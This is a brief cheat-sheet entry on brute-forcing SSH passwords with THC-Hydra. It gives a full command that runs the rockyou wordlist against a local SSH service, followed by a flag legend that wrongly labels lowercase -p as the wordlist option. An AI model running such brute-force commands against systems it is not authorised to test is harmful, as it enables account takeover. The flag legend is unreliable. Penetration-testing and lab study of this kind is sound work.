Attacking SSH with TCH-Hydra:
`hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`
**-l** Target username
**-p** wordlist
**protocol://IP** Syntax for protocol and IP

